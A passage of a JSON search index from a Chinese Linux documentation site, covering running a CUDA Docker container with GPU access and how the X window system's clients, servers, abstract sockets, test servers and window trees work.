\u200b\u7248\u672c\u200b\uff0c\u200b\u9002\u5408\u200b\u7528\u4e8e\u200b\u8bad\u7ec3\u200b\u548c\u200b\u90e8\u7f72\u200b\u6df1\u5ea6\u200b\u5b66\u4e60\u200b\u6a21\u578b\u200b\u3002</li> </ul>"},{"location":"advanced/cuda/#cuda-docker-run","title":"\u521b\u5efa\u200b\u5bb9\u5668","text":"<pre><code>CONTAINER_NAME=cuda_container\nIMAGE=nvidia/cuda:12.4.1-devel-ubuntu22.04\ndocker run -d --name ${CONTAINER_NAME} --gpus all --ipc=host -it -v $(pwd):/workspace ${IMAGE}\ndocker attach ${CONTAINER_NAME}\n</code></pre> <p>\u200b\u8fd9\u200b\u6bb5\u200b\u547d\u4ee4\u200b\u521b\u5efa\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u540d\u4e3a\u200b <code>cuda_container</code> \u200b\u7684\u200b\u540e\u53f0\u200b\u8fd0\u884c\u200b\uff08<code>-d</code>\uff09\u200b\u5bb9\u5668\u200b\uff0c\u200b\u5e76\u200b\u914d\u7f6e\u200b\u5176\u200b\u4f7f\u7528\u200b\u4e3b\u673a\u200b\u7684\u200b\u6240\u6709\u200b GPU \u200b\u8d44\u6e90\u200b\uff08<code>--gpus all</code>\uff09\u3002\u200b\u4f7f\u7528\u200b <code>--ipc=host</code> \u200b\u53c2\u6570\u200b\u6765\u200b\u5171\u4eab\u200b IPC \u200b\u8d44\u6e90\u200b\uff0c\u200b\u540c\u65f6\u200b\u5c06\u200b\u5f53\u524d\u76ee\u5f55\u200b\u6302\u8f7d\u200b\u5230\u200b\u5bb9\u5668\u200b\u5185\u200b\u7684\u200b <code>/workspace</code> \u200b\u76ee\u5f55\u200b\u3002<code>docker attach</code> \u200b\u547d\u4ee4\u200b\u7528\u4e8e\u200b\u8fde\u63a5\u200b\u5230\u200b\u8be5\u200b\u5bb9\u5668\u200b\u8fdb\u884c\u200b\u4ea4\u4e92\u200b\u3002</p> <p>\u200b\u4f60\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>--gpus device=0,1</code> \u200b\u6765\u200b\u6307\u5b9a\u200b\u53ea\u200b\u4f7f\u7528\u200b\u7d22\u5f15\u200b\u4e3a\u200b 0 \u200b\u548c\u200b 1 \u200b\u7684\u200b\u663e\u5361\u200b\u3002</p> <ol> <li> <p>\u200b\u6839\u636e\u200b 2024 \u200b\u5e74\u200b 1 \u200b\u6708\u200b\u8be5\u200b\u89c6\u9891\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u5bf9\u4e8e\u200b\u89c6\u9891\u200b\u4e2d\u200b\u7684\u200b benchmark\uff0c\u200b\u57fa\u4e8e\u200b Nouveau + NVK + Zink \u200b\u7684\u200b\u6027\u80fd\u200b\u8bc4\u5206\u200b\u8fbe\u5230\u200b\u4e86\u200b NVIDIA \u200b\u5b98\u65b9\u200b\u9a71\u52a8\u200b\u7684\u200b 66% \u200b\u5de6\u53f3\u200b\u3002\u00a0\u21a9</p> </li> <li> <p>https://nouveau.freedesktop.org/FeatureMatrix.html \u200b\u4e2d\u200b \"Compute\" \u200b\u4e00\u884c\u200b\u5747\u200b\u4e3a\u200b WIP\uff08Work In Progress\uff09\u200b\u72b6\u6001\u200b\uff0c\u200b\u5373\u200b\u5c1a\u672a\u200b\u652f\u6301\u200b\u3002\u00a0\u21a9</p> </li> </ol>"},{"location":"advanced/dac-mac/","title":"DAC \u200b\u4e0e\u200b MAC","text":"<p>\u200b\u672c\u6587\u200b\u7f16\u5199\u200b\u4e2d\u200b</p>"},{"location":"advanced/desktop/","title":"Linux \u200b\u684c\u9762\u200b\u4e0e\u200b\u7a97\u53e3\u200b\u7cfb\u7edf","text":"<p>\u200b\u4e3b\u8981\u200b\u4f5c\u8005\u200b</p> <p>@taoky</p> <p>\u200b\u672c\u6587\u200b\u7f16\u5199\u200b\u4e2d\u200b</p> <p>\u200b\u76f8\u6bd4\u200b\u4e8e\u200b\u4e45\u8d1f\u76db\u540d\u200b\u7684\u200b Windows \u200b\u4e0e\u200b macOS\uff0cLinux \u200b\u7684\u200b\u684c\u9762\u200b\u4ee5\u53ca\u200b\u5176\u200b\u751f\u6001\u200b\u662f\u200b\u72ec\u7279\u200b\u7684\u200b\u3002\u200b\u672c\u6587\u200b\u5c06\u200b\u7b80\u5355\u200b\u4ecb\u7ecd\u200b Linux \u200b\u684c\u9762\u200b\u4e0e\u200b\u7a97\u53e3\u200b\u7cfb\u7edf\u200b\u4e2d\u200b\u4e00\u4e9b\u200b\u91cd\u8981\u200b\u7684\u200b\u6982\u5ff5\u200b\u3002</p>"},{"location":"advanced/desktop/#x","title":"X","text":""},{"location":"advanced/desktop/#client-server-window","title":"\u5ba2\u6237\u7aef\u200b\u3001\u200b\u670d\u52a1\u7aef\u200b\u4e0e\u200b\u7a97\u53e3","text":"<p>X \u200b\u7a97\u53e3\u200b\u7cfb\u7edf\u200b\u8d77\u6e90\u4e8e\u200b 1984 \u200b\u5e74\u200b\u3002\u200b\u5728\u200b\u90a3\u4e2a\u200b\u65f6\u4ee3\u200b\uff0c\u200b\u684c\u9762\u73af\u5883\u200b\u6ca1\u6709\u200b\u9177\u70ab\u200b\u7684\u200b\u6548\u679c\u200b\uff0c\u200b\u76f8\u6bd4\u4e4b\u4e0b\u200b\uff0c\u200b\u6027\u80fd\u200b\u4e0e\u200b\u8d44\u6e90\u200b\u5360\u7528\u200b\u91cd\u8981\u200b\u5f97\u200b\u591a\u200b\u3002\u200b\u5e76\u4e14\u200b\u5f53\u65f6\u200b\u4e2a\u4eba\u200b\u8ba1\u7b97\u673a\u200b\u8fd8\u662f\u200b\u4e00\u4e2a\u200b\u65b0\u5174\u200b\u7684\u200b\u6982\u5ff5\u200b\uff0c\u200b\u7528\u6237\u200b\u66f4\u200b\u591a\u200b\u7684\u200b\u65f6\u5019\u200b\u9700\u8981\u200b\u4f7f\u7528\u200b\u7ec8\u7aef\u673a\u200b\u8fde\u63a5\u200b\u5230\u200b\u670d\u52a1\u5668\u200b\u4e0a\u200b\u8fd0\u884c\u200b\u4efb\u52a1\u200b\u3002\u200b\u56e0\u6b64\u200b\uff0cX \u200b\u7684\u200b\u8bbe\u8ba1\u200b\u4e0a\u200b\u5305\u542b\u200b\u4e86\u200b\u5f53\u65f6\u200b\u90a3\u4e2a\u200b\u5e74\u4ee3\u200b\u8bbe\u8ba1\u200b\u7684\u200b\u5c40\u9650\u6027\u200b\uff0c\u200b\u5e76\u4e14\u200b\u6709\u7740\u200b\u72ec\u7279\u200b\u7684\u200b\u300c\u200b\u7f51\u7edc\u200b\u900f\u660e\u6027\u200b\u300d\u200b\u7684\u200b\u8bbe\u8ba1\u200b\uff1a\u200b\u9700\u8981\u200b\u663e\u793a\u200b\u7a97\u53e3\u200b\u7684\u200b\u7a0b\u5e8f\u200b\uff08\u200b\u5ba2\u6237\u7aef\u200b\uff09\u200b\u548c\u200b\u53ef\u4ee5\u200b\u7ed9\u200b\u7528\u6237\u200b\u663e\u793a\u200b\u7a97\u53e3\u200b\u7684\u200b\u7a0b\u5e8f\u200b\uff08\u200b\u670d\u52a1\u7aef\u200b\uff09\u200b\u662f\u200b\u53ef\u4ee5\u200b\u5206\u79bb\u200b\u7684\u200b\uff0c\u200b\u901a\u8fc7\u200b\u7f51\u7edc\u200b\u53bb\u200b\u8fde\u63a5\u200b\u3002\u200b\u5bf9\u4e8e\u200b\u5355\u673a\u200b\u573a\u666f\u200b\uff0c\u200b\u8fd9\u91cc\u200b\u7684\u200b\u300c\u200b\u7f51\u7edc\u200b\u300d\u200b\u5927\u90e8\u5206\u200b\u65f6\u5019\u200b\u662f\u200b UNIX socket\uff0c\u200b\u800c\u200b\u5728\u200b\u8bf8\u5982\u200b SSH X Forwarding \u200b\u8fd9\u79cd\u200b\u901a\u8fc7\u200b\u7f51\u7edc\u8fde\u63a5\u200b\u7684\u200b\u573a\u5408\u200b\u5219\u200b\u662f\u200b TCP socket\u3002</p> <p>\u200b\u9ed8\u8ba4\u200b\u60c5\u51b5\u200b\u4e0b\u200b\uff0c\u200b\u5982\u679c\u200b\u4f60\u200b\u6b63\u5728\u200b\u4f7f\u7528\u200b Linux \u200b\u684c\u9762\u200b\uff0c\u200b\u90a3\u4e48\u200b\u9ed8\u8ba4\u200b\u8fde\u63a5\u200b\u5230\u200b\u7684\u200b socket \u200b\u5219\u200b\u4e3a\u200b <code>/tmp/.X11-unix/X0</code>\uff08\u200b\u5bf9\u5e94\u200b\u73af\u5883\u53d8\u91cf\u200b <code>DISPLAY=:0</code>\uff09\u3002</p> <p>X \u200b\u7684\u200b\u62bd\u8c61\u200b\u5957\u200b\u63a5\u5b57\u200b\u652f\u6301\u200b</p> <p>Linux \u200b\u652f\u6301\u200b\u300c\u200b\u62bd\u8c61\u200b\u5957\u200b\u63a5\u5b57\u200b\u300d\uff08abstract socket\uff09\uff0c\u200b\u5373\u200b\u5141\u8bb8\u200b Unix socket \u200b\u7ed1\u5b9a\u200b\u5230\u200b\u4e00\u4e2a\u200b\u4e0d\u200b\u5728\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u4e2d\u200b\u7684\u200b\u5730\u5740\u200b\uff08\u200b\u6b63\u5e38\u200b\u7684\u200b Unix socket \u200b\u9700\u8981\u200b\u5c06\u200b\u5730\u5740\u200b\u8bbe\u7f6e\u200b\u4e3a\u200b\u4e00\u4e2a\u200b\u6587\u4ef6\u200b\u8def\u5f84\u200b\uff09\u3002\u200b\u5728\u200b\u7f16\u5199\u200b\u4ee3\u7801\u200b\u65f6\u200b\uff0c\u200b\u5c06\u200b <code>bind()</code> \u200b\u8def\u5f84\u200b\uff08<code>sun_path</code>\uff09\u200b\u7684\u200b\u5f00\u5934\u200b\u8bbe\u7f6e\u200b\u4e3a\u200b <code>NULL</code> \u200b\u5c31\u200b\u8868\u793a\u200b\u62bd\u8c61\u200b\u5957\u200b\u63a5\u5b57\u200b\u3002\u200b\u53ef\u4ee5\u200b\u67e5\u770b\u200b <code>/proc/net/unix</code> \u200b\u6587\u4ef6\u200b\uff0c\u200b\u5176\u4e2d\u200b\u4ee5\u200b <code>@</code> \u200b\u5f00\u5934\u200b\u7684\u200b\u6761\u76ee\u200b\u5219\u200b\u662f\u200b\u62bd\u8c61\u200b\u5957\u200b\u63a5\u5b57\u200b\u3002</p> <p>\u200b\u53ef\u4ee5\u200b\u6ce8\u610f\u200b\u5230\u200b\uff0c\u200b\u9ed8\u8ba4\u200b\u60c5\u51b5\u200b\u4e0b\u200b\uff0cX \u200b\u670d\u52a1\u7aef\u200b\u4f1a\u200b\u540c\u65f6\u200b\u76d1\u542c\u200b <code>/tmp/.X11-unix/X0</code> \u200b\u548c\u200b <code>@/tmp/.X11-unix/X0</code>\uff1a</p> <pre><code>$ cat /proc/net/unix | grep X11-unix/X0\n000000002c61e829: 00000003 00000000 00000000 0001 03 379918 @/tmp/.X11-unix/X0\n\uff08\u200b\u7701\u7565\u200b\uff09\n0000000055982f40: 00000002 00000000 00010000 0001 01 20744 /tmp/.X11-unix/X0\n\uff08\u200b\u7701\u7565\u200b\uff09\n</code></pre> <p>X \u200b\u5728\u200b 2008 \u200b\u5e74\u200b\u5f15\u5165\u200b\u8fd9\u4e2a\u200b\u7279\u6027\u200b\u65f6\u200b\u7684\u200b\u76f8\u5173\u200b\u8bf4\u660e\u200b\u5982\u4e0b\u200b\uff1a</p> <pre><code>Unlike normal unix sockets, the abstract namespace is not bound to the\nfilesystem.  This has some notable advantages; /tmp need not exist, the\nsocket directory need not have magic permissions, etc.  xtrans servers\nwill listen on both the normal and abstract socket endpoints; clients\nwill attempt to connect to the abstract socket before connecting to the\ncorresponding filesystem socket.\n</code></pre> <p>\u200b\u6240\u4ee5\u200b\u4e8b\u5b9e\u4e0a\u200b\uff0c\u200b\u4e0a\u6587\u200b\u7684\u200b\u63cf\u8ff0\u200b\u662f\u200b\u6709\u200b\u4e00\u4e9b\u200b\u504f\u5dee\u200b\u7684\u200b\u2014\u2014\u200b\u76ee\u524d\u200b X \u200b\u5ba2\u6237\u7aef\u200b\u4ecd\u7136\u200b\u4f1a\u200b\u4f1a\u200b\u4f18\u5148\u200b\u8fde\u63a5\u200b <code>@/tmp/.X11-unix/X0</code>\u3002</p> <p>\u200b\u62bd\u8c61\u200b\u5957\u200b\u63a5\u5b57\u200b\u5728\u200b\u5982\u4eca\u200b\u5e26\u6765\u200b\u4e86\u200b\u4e00\u4e9b\u200b\u5b89\u5168\u6027\u200b\u7684\u200b\u6311\u6218\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u548c\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u4e0a\u200b\u7684\u200b <code>/tmp/.X11-unix/X0</code> \u200b\u53ef\u4ee5\u200b\u4f9d\u9760\u200b\u6587\u4ef6\u200b\u7ea7\u522b\u200b\u7684\u200b\u6743\u9650\u200b\u63a7\u5236\u200b\u4e0d\u540c\u200b\uff0c\u200b\u62bd\u8c61\u200b\u5957\u200b\u63a5\u5b57\u200b\u53ea\u80fd\u200b\u901a\u8fc7\u200b\u7f51\u7edc\u200b\u547d\u540d\u200b\u7a7a\u95f4\u200b\u5b9e\u73b0\u200b\u9694\u79bb\u200b\u3002\u200b\u4f46\u662f\u200b\u5982\u679c\u200b\u76f4\u63a5\u200b\u5173\u95ed\u200b X server \u200b\u7684\u200b\u62bd\u8c61\u200b\u5957\u200b\u63a5\u5b57\u200b\uff0c\u200b\u653b\u51fb\u8005\u200b\u53ef\u4ee5\u200b\u521b\u5efa\u200b\u865a\u5047\u200b\u7684\u200b\u540d\u4e3a\u200b <code>@/tmp/.X11-unix/X0</code> \u200b\u7684\u200b\u5957\u200b\u63a5\u5b57\u200b\uff0c\u200b\u6b3a\u9a97\u200b X \u200b\u5ba2\u6237\u7aef\u200b\u8fde\u63a5\u200b\u3002\u200b\u4e0d\u8fc7\u200b\u8fde\u63a5\u200b\u5230\u200b X server \u200b\u8fd8\u200b\u9700\u8981\u200b\u7ecf\u8fc7\u200b\u4e00\u5c42\u200b\u8ba4\u8bc1\u200b\u673a\u5236\u200b\uff08XAuthority\uff09\uff0c\u200b\u56e0\u6b64\u200b\u5982\u679c\u200b\u4e0d\u53bb\u200b <code>xhost +</code> \u200b\u7684\u8bdd\u200b\uff0c\u200b\u653b\u51fb\u8005\u200b\u5fc5\u987b\u200b\u8981\u200b\u80fd\u591f\u200b\u83b7\u53d6\u200b XAuthority \u200b\u4fe1\u606f\u200b\uff0c\u200b\u624d\u200b\u80fd\u591f\u200b\u8fde\u63a5\u200b\u5230\u200b\u5bf9\u5e94\u200b\u7684\u200b X server\u3002</p> <p>\u200b\u542f\u52a8\u200b\u4e00\u4e2a\u200b\u65b0\u200b\u7684\u200b X Server</p> <p>\u200b\u5b58\u5728\u200b\u8fd9\u6837\u200b\u4e00\u79cd\u200b\u573a\u666f\u200b\uff1a\u200b\u4f60\u200b\u9700\u8981\u200b\u542f\u52a8\u200b\u4e00\u4e2a\u200b\u72ec\u7acb\u200b\u7684\u200b X server \u200b\u6765\u200b\u6d4b\u8bd5\u200b\uff0c\u200b\u800c\u200b\u4e0d\u200b\u5e0c\u671b\u200b\u5bf9\u5e94\u200b\u7684\u200b\u7a0b\u5e8f\u200b\u4f7f\u7528\u200b\u5f53\u524d\u200b\u7684\u200b X server\u3002\u200b\u5176\u4e2d\u200b\u4e00\u4e2a\u200b\u4fbf\u5229\u200b\u7684\u200b\u5de5\u5177\u200b\u662f\u200b <code>xvfb-run</code>\uff1aXvfb \u200b\u662f\u200b\u4e00\u4e2a\u200b\u65e0\u5934\u200b\uff08\u200b\u65e0\u200b\u663e\u793a\u200b\uff09\u200b\u7684\u200b X server\uff0c\u200b\u5bf9\u200b\u81ea\u52a8\u5316\u200b\u6d4b\u8bd5\u200b\u573a\u666f\u200b\u6765\u8bf4\u200b\u5f88\u200b\u65b9\u4fbf\u200b\u3002\u200b\u5b89\u88c5\u200b <code>xvfb</code> \u200b\u5305\u540e\u200b\uff0c\u200b\u5373\u53ef\u200b\u4f7f\u7528\u200b\uff1a</p> <pre><code>xvfb-run -f xvfb-auth -n 99 xeyes\n</code></pre> <p>\u200b\u8fd9\u91cc\u200b\u6211\u4eec\u200b\u8bbe\u7f6e\u200b <code>XAUTHORITY</code> \u200b\u6587\u4ef6\u200b\u4e3a\u200b <code>xvfb-auth</code>\uff0c\u200b\u5e76\u4e14\u200b <code>DISPLAY</code> \u200b\u4e3a\u200b <code>:99</code>\u3002\u200b\u5173\u4e8e\u200b <code>XAUTHORITY</code>\uff0c\u200b\u8bf7\u200b\u53c2\u8003\u200b\u5bb9\u5668\u200b\u90e8\u5206\u200b\u7684\u200b\u4ecb\u7ecd\u200b\u3002\u200b\u7136\u540e\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b\u4ee5\u4e0b\u200b\u547d\u4ee4\u200b\u786e\u8ba4\u200b\uff1a</p> <pre><code>$ DISPLAY=:99 XAUTHORITY=./xvfb-auth xlsclients \nexamplehost  xeyes\n</code></pre> <p>\u200b\u5982\u679c\u200b\u5e0c\u671b\u200b\u521b\u5efa\u200b\u4e00\u4e2a\u200b X server \u200b\u5e76\u4e14\u200b\u80fd\u591f\u200b\u4ee5\u5b50\u200b\u7a97\u53e3\u200b\u7684\u200b\u5f62\u5f0f\u200b\u663e\u793a\u200b\u51fa\u6765\u200b\uff0c\u200b\u90a3\u4e48\u200b\u53ef\u4ee5\u200b\u8003\u8651\u200b\u4f7f\u7528\u200b Xephyr \u200b\u6216\u8005\u200b Xwayland \u200b\u6765\u200b\u521b\u5efa\u200b\u3002\u200b\u4ee5\u200b Xephyr \u200b\u4e3a\u4f8b\u200b\uff0c\u200b\u4ee5\u4e0b\u200b\u547d\u4ee4\u200b\u53ef\u4ee5\u200b\u521b\u5efa\u200b\u4e00\u4e2a\u200b 800x600 \u200b\u7684\u200b X server\uff0c\u200b\u5e76\u4e14\u200b\u4ee5\u200b\u7a97\u53e3\u200b\u7684\u200b\u5f62\u5f0f\u200b\u663e\u793a\u200b\uff1a</p> <pre><code>Xephyr :123 -ac -screen 800x600\n</code></pre> <p>\u200b\u5176\u4ed6\u200b\u5e94\u7528\u200b\u53ef\u4ee5\u200b\u76f4\u63a5\u200b\u7528\u200b <code>DISPLAY=:123</code> \u200b\u73af\u5883\u53d8\u91cf\u200b\u8fde\u63a5\u200b\u5230\u200b\u8fd9\u4e2a\u200b server\u3002\u200b\u5728\u200b Wayland \u200b\u73af\u5883\u200b\u4e0b\u200b\uff0c\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>xwayland-run</code>\uff0c\u200b\u4ee5\u200b Xwayland \u200b\u7684\u200b \"rootful\" \u200b\u6a21\u5f0f\u200b\u8fd0\u884c\u200b\u4e00\u4e2a\u200b\u65b0\u200b\u7684\u200b X server\u3002</p> <p>\u200b\u53ef\u4ee5\u200b\u8fd0\u884c\u200b <code>xlsclients</code> \u200b\u83b7\u53d6\u200b\u8fde\u63a5\u200b\u5230\u200b\u5f53\u524d\u200b X \u200b\u670d\u52a1\u5668\u200b\u7684\u200b\u5ba2\u6237\u7aef\u200b\u5217\u8868\u200b\uff1a</p> <pre><code>$ xlsclients\nexamplehost gsd-xsettings\nexamplehost steamwebhelper\nexamplehost code\nexamplehost mutter-x11-frames\nexamplehost steam\n</code></pre> <p>\u200b\u5ba2\u6237\u7aef\u200b\u53ef\u4ee5\u200b\u521b\u5efa\u200b\u4e00\u4e2a\u200b\u6216\u200b\u591a\u4e2a\u200b\u7a97\u53e3\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>xwininfo</code> \u200b\u83b7\u53d6\u200b\u7a97\u53e3\u200b\u4fe1\u606f\u200b\uff1a</p> <pre><code>$ xwininfo -root -tree\n\nxwininfo: Window id: 0x503 (the root window) (has no name)\n\n  Root window id: 0x503 (the root window) (has no name)\n  Parent window id: 0x0 (none)\n     57 children:\n     0x1a00004 \"desktop.md - Linux201-docs - Visual Studio Code\": (\"code\" \"Code\")  1920x1200+306+1440  +306+1440\n        1 child:\n        0x2200007 (has no name): ()  1920x1200+0+0  +306+1440\n\uff08\u200b\u4ee5\u4e0b\u200b\u7701\u7565\u200b\uff09\n</code></pre> <p>\u200b\u53cd\u200b\u76f4\u89c9\u200b\u7684\u200b\u662f\u200b\uff0c\u200b\u8fd9\u91cc\u200b\u300c\u200b\u7a97\u53e3\u200b\u300d\u200b\u7684\u200b\u6982\u5ff5\u200b\u53ef\u80fd\u200b\u6bd4\u200b\u4f60\u200b\u60f3\u8c61\u200b\u7684\u200b\u8981\u200b\u5e7f\u5f97\u200b\u591a\u200b\u2014\u2014\u200b\u5728\u200b\u4f20\u7edf\u200b\u7684\u200b X11 \u200b\u5e94\u7528\u7a0b\u5e8f\u200b\u4e2d\u200b\uff0c\u200b\u5f88\u591a\u200b\u5c0f\u200b\u63a7\u4ef6\u200b\uff08\u200b\u4f8b\u5982\u200b\u6309\u94ae\u200b\u3001\u200b\u8f93\u5165\u6846\u200b\uff09\u200b\u4e5f\u200b\u90fd\u200b\u662f\u200b\u7a97\u53e3\u200b\u3002\u200b\u53ef\u4ee5\u200b\u5c1d\u8bd5\u200b\u6253\u5f00\u200b\u4e00\u4e2a\u200b\u6bd4\u8f83\u590d\u6742\u200b\u7684\u200b\u4f20\u7edf\u200b X \u200b\u7a0b\u5e8f\u200b\uff08\u200b\u4f8b\u5982\u200b <code>xedit</code>\uff09\uff0c\u200b\u7136\u540e\u200b <code>xwininfo</code> \u200b\u770b\u200b\u4e00\u4e0b\u200b\uff1a</p> <p></p> <p>xedit \u200b\u7684\u200b\u754c\u9762\u200b</p> <pre><code>$ xwininfo -name xedit -tree\n\nxwininfo: Window id: 0x4200072 \"xedit\"\n\n  Root window id: 0x9cf (the root window) (has no name)\n  Parent window id: 0x3800096 (has no name)\n     1 child:\n     0x4200073 (has no name): ()  590x440+0+0  +959+143\n        6 children:\n        0x4200099 (has no name): ()  8x8+572+436  +1531+579\n        0x420007b (has no name): ()  8x8+572+84  +1531+227\n        0x420007c (has no name): ()  590x351+0+89  +959+232\n           4 children:\n           0x420008a (has no name): ()  8x8+586+333  +1545+565\n           0x420008c (has no name): ()  1x1+0+0  +959+232\n              6 children:\n              0x4200096 (has no name): ()  179x21+0+0  +960+233\n                 2 children:\n                 0x4200098 (has no name): ()  85x17+2+2  +963+236\n                 0x4200097 (has no name): ()  64x17+87+2  +1048+236\n              0x4200094 (has no name): ()  100x18+0+0  +960+233\n                 1 child:\n                 0x4200095 (has no name): ()  14x4+-1+-1  +960+233\n              0x4200093 (has no name): ()  8x8+0+0  +960+233\n              0x4200092 (has no name): ()  64x17+0+0  +960+233\n              0x420008e (has no name): ()  1x1+0+0  +960+233\n                 2 children:\n                 0x4200091 (has no name): ()  14x1+-1+-1  +960+233\n                 0x420008f (has no name): ()  1x1+15+0  +976+234\n                    1 child:\n                    0x4200090 (has no name): ()  1x19+0+0  +976+234\n              0x420008d (has no name): ()  8x8+0+0  +960+233\n           0x420008b (has no name): ()  8x8+0+0  +959+232\n           0x420007d (has no name): ()  590x351+0+0  +959+232\n              6 children:\n              0x4200083 (has no name): ()  8x8+572+347  +1531+579\n              0x4200087 (has no name): ()  179x21+0+0  +959+232\n                 2 children:\n                 0x4200089 (has no name): ()  85x17+2+2  +962+235\n                 0x4200088 (has no name): ()  64x17+87+2  +1047+235\n              0x4200085 (has no name): ()  100x18+0+0  +959+232\n                 1 child:\n                 0x4200086 (has no name): ()  14x4+-1+-1  +959+232\n              0x4200084 (has no name): ()  8x8+0+0  +959+232\n              0x4200081 (has no name): ()  590x332+0+19  +959+251\n                 1 child:\n                 0x4200082 (has no name): ()  14x332+-1+-1  +958+250\n              0x420007e (has no name): ()  590x18+0+0  +959+232\n                 2 children:\n                 0x4200080 (has no name): ()  496x15+2+1  +961+233\n                 0x420007f (has no name): ()  90x15+498+1  +1457+233\n        0x420007a (has no name): ()  590x50+0+38  +959+181\n        0x4200079 (has no name): ()  590x18+0+19  +959+162\n        0x4200074 (has no name): ()  590x18+0+0  +959+143\n           4 children:\n           0x4200078 (has no name): ()  479x18+111+0  +1070+143\n           0x4200077 (has no name): ()  36x18+74+0  +1033+143\n           0x4200076 (has no name): ()  36x18+37+0  +996+143\n           0x4200075 (has no name): ()  36x18+0+0  +959+143\n</code></pre> <p>\u200b\u8fd9\u200b\u548c\u200b Windows \u200b\u7684\u200b\u4f20\u7edf\u200b\u684c\u9762\u200b API \u200b\u7684\u200b\u8bbe\u8ba1\u200b\u662f\u200b\u975e\u5e38\u200b\u7c7b\u4f3c\u200b\u7684\u200b\u3002\u200b\u4e0d\u8fc7\u200b\u521b\u5efa\u200b\u5927\u91cf\u200b\u7684\u200b\u5c0f\u200b\u7a97\u53e3\u200b\u9700\u8981\u200b\u6d88\u8017\u200b\u4e0d\u5c11\u200b\u7684\u200b\u7cfb\u7edf\u8d44\u6e90\u200b\uff0c\u200b\u56e0\u6b64\u200b\u76ee\u524d\u200b\u5e38\u89c1\u200b\u7684\u200b\u73b0\u4ee3\u200b UI \u200b\u6846\u67b6\u200b\uff0c\u200b\u4e0d\u7ba1\u200b\u662f\u200b\u5728\u200b Linux \u200b\u8fd8\u662f\u200b\u5728\u200b Windows \u200b\u4e0a\u200b\uff0c\u200b\u90fd\u200b\u57fa\u672c\u4e0a\u200b\u629b\u5f03\u200b\u4e86\u200b\u8fd9\u79cd\u200b\u300c\u200b\u4e07\u7269\u200b\u7686\u200b\u7a97\u53e3\u200b\u300d\u200b\u7684\u200b\u7406\u5ff5\u200b\u3002</p>"},{"location":"advanced/desktop/#window-manager","title":"\u7a97\u53e3\u200b\u7ba1\u7406\u5668","text":"<p>\u200b\u53e6\u200b\u4e00\u70b9\u200b\u6709\u8da3\u200b\u7684\u200b\u662f\u200b\uff0c\u200b\u5c3d\u7ba1\u200b X \u200b\u4e2d\u200b\u5b58\u50a8\u200b\u4e86\u200b\u5404\u4e2a\u200b\u7a97\u53e3\u200b\u7684\u200b\u72b6\u6001\u200b\uff08\u200b\u4ee5\u53ca\u200b\u5b83\u4eec\u200b\u5728\u200b Z \u200b\u8f74\u200b\u7684\u200b\u6808\u5f0f\u200b\u5173\u7cfb\u200b\uff09\uff0c\u200b\u4f46\u662f\u200b X \u200b\u672c\u8eab\u200b\u4e0d\u4f1a\u200b\u53bb\u200b\u7ba1\u7406\u200b\u8fd9\u4e9b\u200b\u7a97\u53e3\u200b\u8981\u200b\u600e\u4e48\u200b\u88ab\u200b\u7528\u6237\u200b\u79fb\u52a8\u200b\u3001\u200b\u7f29\u653e\u200b\u3001\u200b\u6700\u5927\u200b\u6700\u5c0f\u5316\u200b\u7b49\u200b\uff0c\u200b\u4e5f\u200b\u4e0d\u4f1a\u200b\u53bb\u200b\u5c1d\u8bd5\u200b\u88c5\u9970\u200b\u7a97\u53e3\u200b\uff0c\u200b\u5b83\u200b\u53ea\u4f1a\u200b\u6309\u7167\u200b\u81ea\u5df1\u200b\u8bb0\u5f55\u200b\u7684\u200b\u72b6\u6001\u200b\u628a\u200b\u8fd9\u4e9b\u200b\u7a97\u53e3\u200b\u663e\u793a\u200b\u51fa\u6765\u200b\u3002\u200b\u5bf9\u4e8e\u200b\u5177\u4f53\u200b\u7684\u200b\u7a97\u53e3\u200b\u7ba1\u7406\u5de5\u4f5c\u200b\uff0cX \u200b\u5c31\u200b\u5f53\u8d77\u200b\u4e86\u200b\u7529\u624b\u638c\u67dc\u200b\uff0c\u200b\u628a\u200b\u4e8b\u60c5\u200b\u90fd\u200b\u4ea4\u7ed9\u200b\u4e86\u200b\u7a97\u53e3\u200b\u7ba1\u7406\u5668\u200b\u3002\u200b\u7a97\u53e3\u200b\u7ba1\u7406\u5668\u200b\u662f\u200b\u4e00\u4e2a\u200b\u7279\u6b8a\u200b\u7684\u200b X \u200b\u5ba2\u6237\u7aef\u200b\uff0c\u200b\u6240\u6709\u200b\u6211\u4eec\u200b\u5e38\u7528\u200b\u7684\u200b\u7a97\u53e3\u200b\u529f\u80fd\u200b\u90fd\u200b\u662f\u200b\u7531\u200b\u7a97\u53e3\u200b\u7ba1\u7406\u5668\u200b\u8d1f\u8d23\u200b\u7684\u200b\uff0c\u200b\u5305\u62ec\u200b\u4f46\u200b\u4e0d\u200b\u9650\u4e8e\u200b\u7ba1\u7406\u200b\u7a97\u53e3\u200b\u7684\u200b\u663e\u793a\u200b\u5e03\u5c40\u200b\u3001\u200b\u7a97\u53e3\u200b\u88c5\u9970\u200b\u3001\u200b\u7126\u70b9\u200b\u63a7\u5236\u200b\u3001\u200b\u865a\u62df\u200b\u684c\u9762\u200b\u7b49\u7b49\u200b\u3002X \u200b\u670d\u52a1\u7aef\u200b\u5141\u8bb8\u200b\u7a97\u53e3\u200b\u7ba1\u7406\u5668\u200b\u6355\u83b7\u200b\u521b\u5efa\u200b\u7a97\u53e3\u200b\u7684\u200b\u4e8b\u4ef6\u200b\uff0c\u200b\u5e76\u4e14\u200b\u5141\u8bb8\u200b\u7a97\u53e3\u200b\u7ba1\u7406\u5668\u200b\u5c06\u200b\u5bf9\u5e94\u200b\u7684\u200b\u7a97\u53e3\u200b \"reparent\" 